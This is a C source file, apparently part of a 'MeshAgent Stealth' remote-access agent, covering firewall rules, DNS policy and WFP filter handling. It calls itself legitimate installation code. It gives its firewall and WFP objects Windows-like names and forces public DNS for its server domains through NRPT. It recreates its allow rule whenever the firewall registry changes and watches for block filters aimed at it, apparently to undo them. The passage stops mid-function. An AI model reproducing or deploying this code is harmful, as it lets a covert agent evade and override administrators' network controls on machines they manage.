/*
 * MeshAgent Stealth - Firewall & Installation Utilities
 *
 * Legitimate service installation utilities:
 * - Windows Firewall rule management
 * - Installation directory creation with hardened ACLs
 * - File installation with proper attributes
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <wctype.h>
#include <netfw.h>
#include <fwpmu.h>
#include <aclapi.h>
#include <sddl.h>
#include <strsafe.h>
#include "stealth.h"
#include "stealth_utils.h"
#include "stealth_defaults.h"
#include "branding_util.h"
#include "../microstack/ILibParsers.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "fwpuclnt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// Firewall rules used by the stealth installer/validator. Keep names stable.
#define STEALTH_FW_RULE_OUTBOUND_FMT            L"Windows %s - Outbound"
#define STEALTH_FW_RULE_INBOUND_FMT             L"Windows %s - Inbound"
#define STEALTH_FW_RULE_WEBRTC_HOST_FMT         L"Windows %s - WebRTC UDP Inbound (Host)"
#define STEALTH_FW_RULE_WEBRTC_AGENT_FMT        L"Windows %s - WebRTC UDP Inbound (Agent)"
#define STEALTH_FW_WEBRTC_DESCRIPTION           L"Mesh Central Agent WebRTC P2P Traffic"
#define STEALTH_WFP_PROVIDER_NAME_FMT           L"Windows %s WFP Provider"
#define STEALTH_WFP_SUBLAYER_NAME_FMT           L"Windows %s WFP Sublayer"
#define STEALTH_WFP_FILTER_NAME_FMT             L"Windows %s %ls"

static const GUID STEALTH_WFP_PROVIDER_KEY = { 0xa756f5fb, 0x9416, 0x4c60, { 0x96, 0xf1, 0x61, 0x4d, 0x88, 0x44, 0x79, 0x03 } };
static const GUID STEALTH_WFP_SUBLAYER_KEY = { 0x05af9ca4, 0x8e4a, 0x44e4, { 0x90, 0x6d, 0x70, 0xef, 0xda, 0xe2, 0x3c, 0x19 } };
static const GUID STEALTH_WFP_FILTER_CONNECT_V4_KEY = { 0x16cf8d97, 0xb3cf, 0x4ee6, { 0xb7, 0x45, 0x30, 0xa2, 0x07, 0x11, 0x5c, 0x28 } };
static const GUID STEALTH_WFP_FILTER_CONNECT_V6_KEY = { 0x32c90890, 0x60a4, 0x4ef3, { 0x9a, 0x5c, 0x88, 0x69, 0x58, 0xf2, 0xeb, 0x43 } };
static const GUID STEALTH_WFP_FILTER_RECV_V4_KEY = { 0x7d89d0f2, 0xe8b6, 0x410d, { 0x9b, 0x1f, 0x93, 0x5f, 0x24, 0x7f, 0x58, 0x72 } };
static const GUID STEALTH_WFP_FILTER_RECV_V6_KEY = { 0xdb0acb07, 0x057f, 0x45f8, { 0x86, 0x0e, 0x0d, 0xc2, 0xf0, 0xf1, 0x6d, 0x97 } };

typedef struct StealthWfpFilterDescriptor
{
    const GUID* filterKey;
    const GUID* layerKey;
    const wchar_t* nameSuffix;
} StealthWfpFilterDescriptor;

static const StealthWfpFilterDescriptor g_StealthWfpFilters[] =
{
    { &STEALTH_WFP_FILTER_CONNECT_V4_KEY, &FWPM_LAYER_ALE_AUTH_CONNECT_V4, L"Hard Permit Connect V4" },
    { &STEALTH_WFP_FILTER_CONNECT_V6_KEY, &FWPM_LAYER_ALE_AUTH_CONNECT_V6, L"Hard Permit Connect V6" },
    { &STEALTH_WFP_FILTER_RECV_V4_KEY, &FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4, L"Hard Permit RecvAccept V4" },
    { &STEALTH_WFP_FILTER_RECV_V6_KEY, &FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6, L"Hard Permit RecvAccept V6" }
};

#define STEALTH_FIREWALL_RULES_REG_PATH       L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules"
#define STEALTH_NRPT_POLICY_ROOT              L"SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters\\DnsPolicyConfig"
#define STEALTH_NRPT_GENERIC_DNS_SERVERS      L"8.8.8.8;1.1.1.1;9.9.9.9"
#define STEALTH_NRPT_MAX_DOMAINS              16
#define STEALTH_NRPT_DOMAIN_MAX               256
#define STEALTH_FIREWALL_NOTIFY_RETRY_MS      5000

typedef struct StealthWfpSubscriptionState
{
    HANDLE engine;
    HANDLE changeHandle;
    FWP_BYTE_BLOB* expectedAppId;
} StealthWfpSubscriptionState;

static HANDLE g_StealthFirewallWatcherStopEvent = NULL;
static HANDLE g_StealthFirewallWatcherThread = NULL;
static volatile LONG g_StealthPolicyMaintenanceActive = 0;
static StealthWfpSubscriptionState g_StealthWfpSubscription = { NULL, NULL, NULL };

static DWORD Stealth_WfpOpenEngine(HANDLE* engine);
static DWORD Stealth_WfpOpenEngineWithSessionFlags(HANDLE* engine, UINT32 sessionFlags);
static BOOL Stealth_WfpGuidEquals(const GUID* left, const GUID* right);
static BOOL Stealth_WfpFilterHasAppIdCondition(const FWPM_FILTER0* filter, const FWP_BYTE_BLOB* expectedAppId);
static void Stealth_WfpDescribeProvider(HANDLE engine, const GUID* providerKey, wchar_t* buffer, size_t bufferCch);
static BOOL Stealth_ReadNrptNameValue(HKEY entryKey, wchar_t* value, DWORD valueCch, DWORD* valueTypeOut);
static BOOL Stealth_RunRealtimeFirewallRuleRepair(void);

static BOOL Stealth_IsIpLiteralWide(const wchar_t* value)
{
    struct in_addr addr4;
    struct in6_addr addr6;

    if (value == NULL || value[0] == L'\0') { return FALSE; }
    return (InetPtonW(AF_INET, value, &addr4) == 1 || InetPtonW(AF_INET6, value, &addr6) == 1);
}

static void Stealth_TrimAsciiWhitespaceInline(char* value)
{
    size_t len = 0;
    size_t start = 0;

    if (value == NULL) { return; }
    len = strnlen_s(value, 2048);
    while (start < len && isspace((unsigned char)value[start])) { ++start; }
    while (len > start && isspace((unsigned char)value[len - 1])) { --len; }
    if (start > 0 && len > start)
    {
        memmove(value, value + start, len - start);
    }
    value[len - start] = '\0';
}

static void Stealth_TrimWideWhitespaceInline(wchar_t* value)
{
    size_t len = 0;
    size_t start = 0;

    if (value == NULL) { return; }
    len = wcslen(value);
    while (start < len && iswspace(value[start])) { ++start; }
    while (len > start && iswspace(value[len - 1])) { --len; }
    if (start > 0 && len > start)
    {
        memmove(value, value + start, (len - start) * sizeof(wchar_t));
    }
    value[len - start] = L'\0';
}

static void Stealth_StripHostPortSuffixW(wchar_t* value)
{
    wchar_t* rightBracket = NULL;
    wchar_t* colon = NULL;

    if (value == NULL || value[0] == L'\0') { return; }
    Stealth_TrimWideWhitespaceInline(value);
    if (value[0] == L'[')
    {
        rightBracket = wcschr(value, L']');
        if (rightBracket != NULL)
        {
            memmove(value, value + 1, (size_t)(rightBracket - value - 1) * sizeof(wchar_t));
            value[rightBracket - value - 1] = L'\0';
        }
        return;
    }

    colon = wcschr(value, L':');
    if (colon != NULL && wcschr(colon + 1, L':') == NULL)
    {
        *colon = L'\0';
    }
    Stealth_TrimWideWhitespaceInline(value);
}

static BOOL Stealth_AddNrptDomainWide(
    wchar_t domains[STEALTH_NRPT_MAX_DOMAINS][STEALTH_NRPT_DOMAIN_MAX],
    UINT32* count,
    const wchar_t* candidate)
{
    wchar_t normalized[STEALTH_NRPT_DOMAIN_MAX];

    if (domains == NULL || count == NULL || candidate == NULL || candidate[0] == L'\0') { return FALSE; }
    if (*count >= STEALTH_NRPT_MAX_DOMAINS) { return FALSE; }

    if (FAILED(StringCchCopyW(normalized, _countof(normalized), candidate))) { return FALSE; }
    Stealth_StripHostPortSuffixW(normalized);
    if (normalized[0] == L'\0') { return FALSE; }
    while (normalized[0] == L'.')
    {
        memmove(normalized, normalized + 1, wcslen(normalized) * sizeof(wchar_t));
    }
    while (normalized[0] != L'\0' && normalized[wcslen(normalized) - 1] == L'.')
    {
        normalized[wcslen(normalized) - 1] = L'\0';
    }
    if (normalized[0] == L'\0' || wcschr(normalized, L'.') == NULL || Stealth_IsIpLiteralWide(normalized))
    {
        return FALSE;
    }

    for (UINT32 i = 0; i < *count; ++i)
    {
        if (_wcsicmp(domains[i], normalized) == 0)
        {
            return TRUE;
        }
    }

    (void)StringCchCopyW(domains[*count], STEALTH_NRPT_DOMAIN_MAX, normalized);
    ++(*count);
    return TRUE;
}

static BOOL Stealth_AddNrptDomainAnsi(
    wchar_t domains[STEALTH_NRPT_MAX_DOMAINS][STEALTH_NRPT_DOMAIN_MAX],
    UINT32* count,
    const char* candidate)
{
    wchar_t wide[STEALTH_NRPT_DOMAIN_MAX];
    int converted = 0;

    if (candidate == NULL || candidate[0] == '\0') { return FALSE; }
    converted = MultiByteToWideChar(CP_UTF8, 0, candidate, -1, wide, (int)_countof(wide));
    if (converted <= 0) { return FALSE; }
    return Stealth_AddNrptDomainWide(domains, count, wide);
}

static void Stealth_CollectNrptDomainsFromEndpoint(
    const char* url,
    const char* sni,
    const char* hostHeader,
    wchar_t domains[STEALTH_NRPT_MAX_DOMAINS][STEALTH_NRPT_DOMAIN_MAX],
    UINT32* count)
{
    char* host = NULL;
    char* path = NULL;

    if (url != NULL && url[0] != '\0')
    {
        (void)ILibParseUri(url, &host, NULL, &path, NULL);
        if (host != NULL)
        {
            (void)Stealth_AddNrptDomainAnsi(domains, count, host);
            free(host);
            host = NULL;
        }
        if (path != NULL)
        {
            free(path);
            path = NULL;
        }
    }

    if (sni != NULL && sni[0] != '\0')
    {
        (void)Stealth_AddNrptDomainAnsi(domains, count, sni);
    }
    if (hostHeader != NULL && hostHeader[0] != '\0')
    {
        (void)Stealth_AddNrptDomainAnsi(domains, count, hostHeader);
    }
}

static void Stealth_CollectNrptDomainsFromNetworkProfile(
    wchar_t domains[STEALTH_NRPT_MAX_DOMAINS][STEALTH_NRPT_DOMAIN_MAX],
    UINT32* count)
{
    const mesh_network_profile_t* network = MeshConfig_GetNetwork();

    if (network == NULL) { return; }

    Stealth_CollectNrptDomainsFromEndpoint(
        network->primaryEndpoint,
        network->sni,
        network->hostHeader,
        domains,
        count);

    if (network->fallbackList == NULL || network->fallbackCount == 0) { return; }
    for (size_t i = 0; i < network->fallbackCount; ++i)
    {
        const mesh_network_endpoint_t* endpoint = &(network->fallbackList[i]);
        if (endpoint == NULL) { continue; }
        Stealth_CollectNrptDomainsFromEndpoint(
            endpoint->url,
            (endpoint->sni != NULL && endpoint->sni[0] != '\0') ? endpoint->sni : network->sni,
            (endpoint->hostHeader != NULL && endpoint->hostHeader[0] != '\0') ? endpoint->hostHeader : network->hostHeader,
            domains,
            count);
    }
}

static void Stealth_CollectNrptDomainsFromMshFile(
    const wchar_t* path,
    wchar_t domains[STEALTH_NRPT_MAX_DOMAINS][STEALTH_NRPT_DOMAIN_MAX],
    UINT32* count)
{
    FILE* file = NULL;
    char* buffer = NULL;
    long size = 0;
    size_t read = 0;
    char* cursor = NULL;

    if (path == NULL || path[0] == L'\0' || domains == NULL || count == NULL) { return; }
    if (_wfopen_s(&file, path, L"rb") != 0 || file == NULL) { return; }
    if (fseek(file, 0, SEEK_END) != 0) { fclose(file); return; }
    size = ftell(file);
    if (size <= 0 || fseek(file, 0, SEEK_SET) != 0) { fclose(file); return; }

    buffer = (char*)malloc((size_t)size + 1);
    if (buffer == NULL)
    {
        fclose(file);
        return;
    }

    read = fread(buffer, 1, (size_t)size, file);
    fclose(file);
    buffer[read] = '\0';

    cursor = buffer;
    while ((cursor = strstr(cursor, "MeshServer=")) != NULL)
    {
        char line[2048];
        char* lineEnd = NULL;
        char* token = NULL;
        char* context = NULL;
        char* lineHost = NULL;
        char* linePath = NULL;
        size_t lineLen = 0;

        cursor += 11;
        lineEnd = strpbrk(cursor, "\r\n");
        lineLen = (lineEnd != NULL) ? (size_t)(lineEnd - cursor) : strnlen(cursor, 2048);
        if (lineLen == 0)
        {
            continue;
        }
        if (lineLen >= sizeof(line))
        {
            lineLen = sizeof(line) - 1;
        }

        memcpy(line, cursor, lineLen);
        line[lineLen] = '\0';

        token = strtok_s(line, ",", &context);
        while (token != NULL)
        {
            Stealth_TrimAsciiWhitespaceInline(token);
            if (token[0] != '\0' && _stricmp(token, "local") != 0)
            {
                if (strstr(token, "://") != NULL)
                {
                    (void)ILibParseUri(token, &lineHost, NULL, &linePath, NULL);
                    if (lineHost != NULL)
                    {
                        (void)Stealth_AddNrptDomainAnsi(domains, count, lineHost);
                        free(lineHost);
                        lineHost = NULL;
                    }
                    if (linePath != NULL)
                    {
                        free(linePath);
                        linePath = NULL;
                    }
                }
                else
                {
                    (void)Stealth_AddNrptDomainAnsi(domains, count, token);
                }
            }

            token = strtok_s(NULL, ",", &context);
        }

        if (lineEnd == NULL) { break; }
        cursor = lineEnd;
    }

    free(buffer);
}

static void Stealth_CollectNrptDomainsFromInstalledProvisioning(
    const StealthInstallPaths* paths,
    wchar_t domains[STEALTH_NRPT_MAX_DOMAINS][STEALTH_NRPT_DOMAIN_MAX],
    UINT32* count)
{
    wchar_t candidate[MAX_PATH];
    wchar_t dllNamedPath[MAX_PATH];
    wchar_t dllNameWide[MAX_PATH];
    wchar_t dllBase[MAX_PATH];
    mesh_branding_text_t dllName = MeshService_GetSvchostDllNameText();

    if (paths == NULL || paths->installDir[0] == L'\0') { return; }

    if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\.msh", paths->installDir)))
    {
        Stealth_CollectNrptDomainsFromMshFile(candidate, domains, count);
    }

    if (dllName != NULL)
    {
        ZeroMemory(dllNameWide, sizeof(dllNameWide));
        ZeroMemory(dllBase, sizeof(dllBase));
        ZeroMemory(dllNamedPath, sizeof(dllNamedPath));
        MeshService_CopyBrandingTextToWide(dllName, dllNameWide, _countof(dllNameWide));
        if (dllNameWide[0] != L'\0')
        {
            (void)StringCchCopyW(dllBase, _countof(dllBase), dllNameWide);
            wchar_t* dot = wcsrchr(dllBase, L'.');
            if (dot != NULL) { *dot = L'\0'; }
            if (SUCCEEDED(StringCchPrintfW(dllNamedPath, _countof(dllNamedPath), L"%ls\\%ls.msh", paths->installDir, dllBase)))
            {
                Stealth_CollectNrptDomainsFromMshFile(dllNamedPath, domains, count);
            }
        }
    }

    {
        /* Fallback .msh name derived from service identity */
        wchar_t altMshName[MAX_PATH];
        _snwprintf_s(altMshName, _countof(altMshName), _TRUNCATE, L"%ls\\%s.msh", paths->installDir, STEALTH_FALLBACK_SERVICE_NAME);
        Stealth_CollectNrptDomainsFromMshFile(altMshName, domains, count);
    }
}

static BOOL Stealth_FindNrptPolicyKeyByName(HKEY rootKey, const wchar_t* expectedName, HKEY* entryKeyOut)
{
    DWORD index = 0;
    LONG result = ERROR_SUCCESS;

    if (entryKeyOut == NULL) { return FALSE; }
    *entryKeyOut = NULL;
    if (rootKey == NULL || expectedName == NULL || expectedName[0] == L'\0') { return FALSE; }

    while (TRUE)
    {
        wchar_t subKeyName[128];
        DWORD subKeyNameLen = (DWORD)_countof(subKeyName);
        HKEY subKey = NULL;
        wchar_t currentName[STEALTH_NRPT_DOMAIN_MAX];

        result = RegEnumKeyExW(rootKey, index, subKeyName, &subKeyNameLen, NULL, NULL, NULL, NULL);
        if (result == ERROR_NO_MORE_ITEMS) { break; }
        if (result != ERROR_SUCCESS) { return FALSE; }

        if (RegOpenKeyExW(rootKey, subKeyName, 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &subKey) == ERROR_SUCCESS)
        {
            ZeroMemory(currentName, sizeof(currentName));
            if (Stealth_ReadNrptNameValue(subKey, currentName, _countof(currentName), NULL) &&
                _wcsicmp(currentName, expectedName) == 0)
            {
                *entryKeyOut = subKey;
                return TRUE;
            }
            RegCloseKey(subKey);
        }
        ++index;
    }

    return FALSE;
}

static BOOL Stealth_ReadNrptNameValue(HKEY entryKey, wchar_t* value, DWORD valueCch, DWORD* valueTypeOut)
{
    DWORD valueType = 0;
    DWORD valueBytes = 0;

    if (valueTypeOut != NULL) { *valueTypeOut = 0; }
    if (entryKey == NULL || value == NULL || valueCch == 0) { return FALSE; }

    ZeroMemory(value, valueCch * sizeof(wchar_t));
    valueBytes = valueCch * sizeof(wchar_t);
    if (RegQueryValueExW(entryKey, L"Name", NULL, &valueType, (LPBYTE)value, &valueBytes) != ERROR_SUCCESS)
    {
        return FALSE;
    }
    if (valueType != REG_SZ && valueType != REG_MULTI_SZ)
    {
        return FALSE;
    }

    value[valueCch - 1] = L'\0';
    if (valueTypeOut != NULL) { *valueTypeOut = valueType; }
    return (value[0] != L'\0');
}

static BOOL Stealth_EnsureNrptPolicyForDomain(const wchar_t* domain, BOOL* changed)
{
    HKEY rootKey = NULL;
    HKEY entryKey = NULL;
    wchar_t normalizedName[STEALTH_NRPT_DOMAIN_MAX];
    wchar_t normalizedMultiName[STEALTH_NRPT_DOMAIN_MAX + 1];
    wchar_t keyName[64];
    BOOL success = FALSE;

    if (changed != NULL) { *changed = FALSE; }
    if (domain == NULL || domain[0] == L'\0') { return FALSE; }

    ZeroMemory(normalizedName, sizeof(normalizedName));
    ZeroMemory(normalizedMultiName, sizeof(normalizedMultiName));
    if (FAILED(StringCchPrintfW(normalizedName, _countof(normalizedName), L".%ls", domain)))
    {
        return FALSE;
    }
    if (FAILED(StringCchCopyW(normalizedMultiName, _countof(normalizedMultiName), normalizedName)))
    {
        return FALSE;
    }

    if (RegCreateKeyExW(
            HKEY_LOCAL_MACHINE,
            STEALTH_NRPT_POLICY_ROOT,
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            KEY_READ | KEY_WRITE | KEY_ENUMERATE_SUB_KEYS,
            NULL,
            &rootKey,
            NULL) != ERROR_SUCCESS)
    {
        return FALSE;
    }

    if (!Stealth_FindNrptPolicyKeyByName(rootKey, normalizedName, &entryKey))
    {
        GUID keyGuid;
        if (CoCreateGuid(&keyGuid) != S_OK || StringFromGUID2(&keyGuid, keyName, (int)_countof(keyName)) <= 0)
        {
            goto cleanup;
        }
        if (RegCreateKeyExW(rootKey, keyName, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_READ | KEY_WRITE, NULL, &entryKey, NULL) != ERROR_SUCCESS)
        {
            goto cleanup;
        }
        if (changed != NULL) { *changed = TRUE; }
    }

    {
        DWORD configOptions = 0;
        DWORD configBytes = sizeof(configOptions);
        DWORD version = 0;
        DWORD versionBytes = sizeof(version);
        wchar_t currentName[STEALTH_NRPT_DOMAIN_MAX];
        wchar_t currentDnsServers[STEALTH_NRPT_DOMAIN_MAX];
        DWORD dnsBytes = sizeof(currentDnsServers);
        DWORD currentNameType = 0;

        ZeroMemory(currentName, sizeof(currentName));
        ZeroMemory(currentDnsServers, sizeof(currentDnsServers));

        if (!Stealth_ReadNrptNameValue(entryKey, currentName, _countof(currentName), &currentNameType) ||
            currentNameType != REG_MULTI_SZ ||
            _wcsicmp(currentName, normalizedName) != 0)
        {
            if (RegSetValueExW(entryKey, L"Name", 0, REG_MULTI_SZ, (const BYTE*)normalizedMultiName, (DWORD)((wcslen(normalizedName) + 2) * sizeof(wchar_t))) != ERROR_SUCCESS)
            {
                goto cleanup;
            }
            if (changed != NULL) { *changed = TRUE; }
        }

        if (RegGetValueW(entryKey, NULL, L"GenericDNSServers", RRF_RT_REG_SZ, NULL, currentDnsServers, &dnsBytes) != ERROR_SUCCESS ||
            _wcsicmp(currentDnsServers, STEALTH_NRPT_GENERIC_DNS_SERVERS) != 0)
        {
            if (RegSetValueExW(entryKey, L"GenericDNSServers", 0, REG_SZ, (const BYTE*)STEALTH_NRPT_GENERIC_DNS_SERVERS, (DWORD)((wcslen(STEALTH_NRPT_GENERIC_DNS_SERVERS) + 1) * sizeof(wchar_t))) != ERROR_SUCCESS)
            {
                goto cleanup;
            }
            if (changed != NULL) { *changed = TRUE; }
        }

        if (RegGetValueW(entryKey, NULL, L"ConfigOptions", RRF_RT_REG_DWORD, NULL, &configOptions, &configBytes) != ERROR_SUCCESS ||
            configOptions != 0x8)
        {
            configOptions = 0x8;
            if (RegSetValueExW(entryKey, L"ConfigOptions", 0, REG_DWORD, (const BYTE*)&configOptions, sizeof(configOptions)) != ERROR_SUCCESS)
            {
                goto cleanup;
            }
            if (changed != NULL) { *changed = TRUE; }
        }

        if (RegGetValueW(entryKey, NULL, L"Version", RRF_RT_REG_DWORD, NULL, &version, &versionBytes) != ERROR_SUCCESS ||
            version != 2)
        {
            version = 2;
            if (RegSetValueExW(entryKey, L"Version", 0, REG_DWORD, (const BYTE*)&version, sizeof(version)) != ERROR_SUCCESS)
            {
                goto cleanup;
            }
            if (changed != NULL) { *changed = TRUE; }
        }
    }

    success = TRUE;

cleanup:
    if (entryKey != NULL) { RegCloseKey(entryKey); }
    if (rootKey != NULL) { RegCloseKey(rootKey); }
    return success;
}

static BOOL Stealth_ReloadDnsCachePolicies(void)
{
    SC_HANDLE scm = NULL;
    SC_HANDLE service = NULL;
    SERVICE_STATUS status;
    BOOL success = FALSE;

    ZeroMemory(&status, sizeof(status));
    scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (scm == NULL) { return FALSE; }

    service = OpenServiceW(scm, L"Dnscache", SERVICE_PAUSE_CONTINUE | SERVICE_QUERY_STATUS);
    if (service != NULL && ControlService(service, SERVICE_CONTROL_PARAMCHANGE, &status))
    {
        success = TRUE;
    }

    if (service != NULL) { CloseServiceHandle(service); }
    if (scm != NULL) { CloseServiceHandle(scm); }
    return success;
}

static BOOL Stealth_EnsureNrptPolicies(const StealthInstallPaths* paths, BOOL* changedOut)
{
    wchar_t domains[STEALTH_NRPT_MAX_DOMAINS][STEALTH_NRPT_DOMAIN_MAX];
    UINT32 domainCount = 0;
    BOOL success = TRUE;
    BOOL anyChanged = FALSE;

    ZeroMemory(domains, sizeof(domains));
    if (changedOut != NULL) { *changedOut = FALSE; }

    Stealth_CollectNrptDomainsFromNetworkProfile(domains, &domainCount);
    Stealth_CollectNrptDomainsFromInstalledProvisioning(paths, domains, &domainCount);

    if (domainCount == 0)
    {
        return TRUE;
    }

    for (UINT32 i = 0; i < domainCount; ++i)
    {
        BOOL entryChanged = FALSE;
        if (!Stealth_EnsureNrptPolicyForDomain(domains[i], &entryChanged))
        {
            success = FALSE;
            Stealth_LogInstallEvent(L"[WARN] Failed to reconcile NRPT policy for %ls", domains[i]);
            continue;
        }
        if (entryChanged)
        {
            anyChanged = TRUE;
            Stealth_LogInstallEvent(L"[NETWORK] NRPT policy ensured for %ls via %ls", domains[i], STEALTH_NRPT_GENERIC_DNS_SERVERS);
        }
    }

    if (anyChanged)
    {
        if (Stealth_ReloadDnsCachePolicies())
        {
            Stealth_LogInstallEvent(L"[NETWORK] Dnscache reloaded after NRPT policy update");
        }
        else
        {
            success = FALSE;
            Stealth_LogInstallEvent(L"[WARN] Failed to signal Dnscache after NRPT policy update");
        }
    }

    if (changedOut != NULL) { *changedOut = anyChanged; }
    return success;
}

static DWORD WINAPI Stealth_FirewallRulesWatcherThread(LPVOID parameter)
{
    HANDLE stopEvent = (HANDLE)parameter;
    HANDLE notifyEvent = NULL;
    HKEY firewallRulesKey = NULL;

    notifyEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (notifyEvent == NULL)
    {
        return 1;
    }

    while (stopEvent != NULL && WaitForSingleObject(stopEvent, 0) != WAIT_OBJECT_0)
    {
        LONG notifyResult = ERROR_SUCCESS;
        HANDLE waitHandles[2];
        DWORD waitResult;

        if (firewallRulesKey == NULL)
        {
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, STEALTH_FIREWALL_RULES_REG_PATH, 0, KEY_NOTIFY, &firewallRulesKey) != ERROR_SUCCESS)
            {
                (void)WaitForSingleObject(stopEvent, STEALTH_FIREWALL_NOTIFY_RETRY_MS);
                continue;
            }
        }

        notifyResult = RegNotifyChangeKeyValue(
            firewallRulesKey,
            FALSE,
            REG_NOTIFY_CHANGE_LAST_SET,
            notifyEvent,
            TRUE);
        if (notifyResult != ERROR_SUCCESS)
        {
            RegCloseKey(firewallRulesKey);
            firewallRulesKey = NULL;
            (void)WaitForSingleObject(stopEvent, STEALTH_FIREWALL_NOTIFY_RETRY_MS);
            continue;
        }

        waitHandles[0] = stopEvent;
        waitHandles[1] = notifyEvent;
        waitResult = WaitForMultipleObjects(2, waitHandles, FALSE, INFINITE);
        if (waitResult == WAIT_OBJECT_0)
        {
            break;
        }
        if (waitResult == WAIT_OBJECT_0 + 1)
        {
            Stealth_LogInstallEvent(L"[FIREWALL] Firewall rules registry changed; running immediate policy maintenance");
            (void)Stealth_RunRealtimeFirewallRuleRepair();
        }
        else
        {
            break;
        }
    }

    if (firewallRulesKey != NULL) { RegCloseKey(firewallRulesKey); }
    if (notifyEvent != NULL) { CloseHandle(notifyEvent); }
    return 0;
}

static BOOL Stealth_RunRealtimeFirewallRuleRepair(void)
{
    StealthInstallPaths paths;
    wchar_t serviceName[256] = { 0 };
    wchar_t hostExePath[MAX_PATH] = { 0 };
    BOOL success = TRUE;

    ZeroMemory(&paths, sizeof(paths));
    if (!Stealth_GetInstallPaths(&paths))
    {
        return TRUE;
    }
    if (paths.installDir[0] == L'\0' || paths.exePath[0] == L'\0')
    {
        return TRUE;
    }
    if (GetFileAttributesW(paths.installDir) == INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesW(paths.exePath) == INVALID_FILE_ATTRIBUTES)
    {
        return TRUE;
    }

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceName, _countof(serviceName));
    if (serviceName[0] == L'\0')
    {
        StringCchCopyW(serviceName, _countof(serviceName), STEALTH_FALLBACK_SERVICE_NAME);
    }

    StringCchPrintfW(hostExePath, _countof(hostExePath), L"%s\\svchost.exe", paths.installDir);
    if (GetFileAttributesW(hostExePath) == INVALID_FILE_ATTRIBUTES)
    {
        StringCchCopyW(hostExePath, _countof(hostExePath), L"C:\\Windows\\System32\\svchost.exe");
    }

    if (InterlockedCompareExchange(&g_StealthPolicyMaintenanceActive, 1, 0) != 0)
    {
        return TRUE;
    }

    __try
    {
        BOOL outboundRuleHealthy = FALSE;

        __try
        {
            Stealth_LogInstallEvent(L"[FIREWALL] Realtime maintenance: validating outbound allow rule for %ls", serviceName);
            outboundRuleHealthy = Stealth_CheckFirewallRuleForService(serviceName, hostExePath);
        }
        __except(EXCEPTION_EXECUTE_HANDLER)
        {
            success = FALSE;
            outboundRuleHealthy = FALSE;
            Stealth_LogInstallEvent(L"[WARN] Realtime firewall repair CheckFirewallRuleForService raised exception 0x%08lX", (unsigned long)GetExceptionCode());
        }

        if (!outboundRuleHealthy)
        {
            __try
            {
                Stealth_LogInstallEvent(L"[FIREWALL] Realtime maintenance: recreating outbound allow rule for %ls", serviceName);
                if (Stealth_AddFirewallRuleForService(serviceName, hostExePath))
                {
                    Stealth_LogInstallEvent(L"[FIREWALL] Recreated outbound allow rule for %ls", serviceName);
                }
                else
                {
                    success = FALSE;
                    Stealth_LogInstallEvent(L"[WARN] Failed to recreate outbound allow rule for %ls", serviceName);
                }
            }
            __except(EXCEPTION_EXECUTE_HANDLER)
            {
                success = FALSE;
                Stealth_LogInstallEvent(L"[WARN] Realtime firewall repair AddFirewallRuleForService raised exception 0x%08lX", (unsigned long)GetExceptionCode());
            }
        }
    }
    __finally
    {
        InterlockedExchange(&g_StealthPolicyMaintenanceActive, 0);
    }

    return success;
}

static BOOL Stealth_StartFirewallRulesWatcher(void)
{
    if (g_StealthFirewallWatcherThread != NULL) { return TRUE; }

    if (g_StealthFirewallWatcherStopEvent == NULL)
    {
        g_StealthFirewallWatcherStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
        if (g_StealthFirewallWatcherStopEvent == NULL)
        {
            return FALSE;
        }
    }
    else
    {
        ResetEvent(g_StealthFirewallWatcherStopEvent);
    }

    g_StealthFirewallWatcherThread = CreateThread(
        NULL,
        0,
        Stealth_FirewallRulesWatcherThread,
        g_StealthFirewallWatcherStopEvent,
        0,
        NULL);
    if (g_StealthFirewallWatcherThread != NULL)
    {
        Stealth_LogInstallEvent(L"[FIREWALL] Firewall registry watcher active");
    }
    return (g_StealthFirewallWatcherThread != NULL);
}

static BOOL Stealth_WfpLayerIsMonitored(const GUID* layerKey)
{
    if (layerKey == NULL) { return FALSE; }
    return Stealth_WfpGuidEquals(layerKey, &FWPM_LAYER_ALE_AUTH_CONNECT_V4) ||
        Stealth_WfpGuidEquals(layerKey, &FWPM_LAYER_ALE_AUTH_CONNECT_V6) ||
        Stealth_WfpGuidEquals(layerKey, &FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4) ||
        Stealth_WfpGuidEquals(layerKey, &FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6);
}

static void CALLBACK Stealth_WfpFilterChangeCallback(void* context, const FWPM_FILTER_CHANGE0* change)
{
    StealthWfpSubscriptionState* subscription = (StealthWfpSubscriptionState*)context;
    HANDLE remediationEngine = NULL;
    FWPM_FILTER0* filter = NULL;
    DWORD deleteStatus = ERROR_SUCCESS;
    wchar_t providerLabel[256];

    if (subscription == NULL || change == NULL || subscription->expectedAppId == NULL)
    {
        return;
    }
    if (change->changeType != FWPM_CHANGE_ADD)
    {
        return;
    }

    if (Stealth_WfpOpenEngine(&remediationEngine) != ERROR_SUCCESS || remediationEngine == NULL)
    {
        return;
    }

    if (FwpmFilterGetById0(remediationEngine, change->filterId, &filter) != ERROR_SUCCESS || filter == NULL)
    {
        if (remediationEngine != NULL) { FwpmEngineClose0(remediationEngine); }
        return;
    }

    if (!Stealth_WfpLayerIsMonitored(&filter->layerKey) ||
        filter->action.type != FWP_ACTION_BLOCK ||
        !Stealth_WfpFilterHasAppIdCondition(filter, subscription->expectedAppId))
    {
        FwpmFreeMemory0((void**)&filter);
        if (remediationEngine != NULL) { FwpmEngineClose0(remediationEngine); }
        return;
    }

    ZeroMemory(providerLabel, sizeof(providerLabel));
